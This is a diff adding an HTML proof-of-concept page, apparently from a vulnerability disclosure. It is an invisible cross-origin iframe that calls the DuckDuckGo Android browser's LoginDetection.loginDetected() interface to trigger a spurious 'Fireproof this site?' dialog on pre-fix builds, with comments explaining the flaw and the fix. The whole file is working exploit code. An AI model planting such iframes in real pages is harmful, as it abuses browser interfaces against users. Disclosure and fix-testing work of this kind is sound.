@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login-Detection PoC — Cross-Origin Attacker iframe</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #ccc; padding: 16px; margin: 0; font-size: 0.85rem; }
+    h1   { color: #f44336; font-size: 1rem; margin: 0 0 12px; }
+    .ok  { color: #69f0ae; }
+    .err { color: #ff5252; }
+    .inf { color: #40c4ff; }
+    .wrn { color: #ffd740; }
+    ul   { list-style: none; padding: 0; margin: 0; }
+    li   { margin: 3px 0; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <h1>☠ Login-Detection PoC — Cross-Origin Attacker iframe</h1>
+  <ul id="log"></ul>
+
+  <script>
+    /* ====================================================================
+       LoginDetectionJavascriptInterface — Cross-Origin Attack (pre-fix)
+
+       Vulnerability: LoginDetection.loginDetected() required NO secret.
+       Effect:        Any frame, including cross-origin iframes, could call
+                      loginDetected() to trigger DDG's "Fireproof this site?"
+                      dialog for whatever URL the user was currently viewing —
+                      regardless of whether an actual login occurred.
+
+       This page is loaded as an invisible cross-origin iframe inside
+       login-detection-poc.html. It calls the interface from a different
+       origin, proving that SOP does NOT protect @JavascriptInterface methods.
+
+       NOTE: We never access window.top or window.parent properties —
+       cross-origin frame property access throws SecurityError (SOP).
+       We report status to the parent via postMessage instead.
+       ==================================================================== */
+
+    function log(text, cls) {
+      var li = document.createElement('li');
+      li.className = cls || '';
+      li.textContent = '[' + new Date().toISOString() + '] ' + text;
+      document.getElementById('log').appendChild(li);
+      /* Report to parent via postMessage. We use '*' as the target origin intentionally:
+         the victim page URL is unknown to us (cross-origin SOP prevents reading it), and
+         postMessage with '*' is safe here because the message contains no secrets —
+         it is only a UI status string for the PoC evidence log. */
+      try {
+        window.parent.postMessage({ pocType: 'logindetection-status', text: text, cls: cls }, '*');
+      } catch (e) { /* ignore */ }
+    }
+
+    log('Attacker iframe loaded (origin: ' + window.location.origin + '). Checking for LoginDetection…', 'inf');
+
+    setTimeout(function () {
+
+      /* ── Step 1: Verify the interface is accessible ──────────── */
+      if (typeof LoginDetection === 'undefined') {
+        log(
+          'LoginDetection NOT found. Load in DuckDuckGo Android browser ' +
+          '(Settings → Privacy → Auto-dismiss cookie pop-ups must be on or login detection active).',
+          'err'
+        );
+        return;
+      }
+
+      log('LoginDetection interface FOUND from cross-origin iframe — SOP does NOT protect @JavascriptInterface!', 'ok');
+
+      /* ── Step 2: Fire the attack ─────────────────────────────────
+         Pre-fix call: LoginDetection.loginDetected() — zero args.
+         On the vulnerable (pre-fix) build this triggers the fireproof
+         dialog for the MAIN FRAME's URL (the victim page's URL),
+         even though this iframe is from a completely different origin.  */
+      try {
+        LoginDetection.loginDetected();
+        log(
+          'loginDetected() called with zero args (pre-fix path). ' +
+          'On vulnerable build: DDG fireproof dialog fires for the victim page URL. ' +
+          'This iframe is cross-origin — SOP did NOT prevent the call.',
+          'ok'
+        );
+      } catch (e) {
+        log('loginDetected() zero-arg call threw: ' + e.message, 'wrn');
+      }
+
+      /* ── Step 3: Try the empty-secret call (fixed build will reject) */
+      setTimeout(function () {
+        try {
+          LoginDetection.loginDetected('');
+          log(
+            'loginDetected("") called (empty secret). ' +
+            'Fixed build: silently rejected. Vulnerable build: irrelevant (zero-arg method matched).',
+            'wrn'
+          );
+        } catch (e) {
+          log('loginDetected("") threw: ' + e.message, 'wrn');
+        }
+
+        log('Attack complete. Parent page should show DDG fireproof dialog for its URL.', 'inf');
+      }, 200);
+
+    }, 400); /* slight delay so parent page arms its postMessage listener first */
+  </script>
+</body>
+</html>
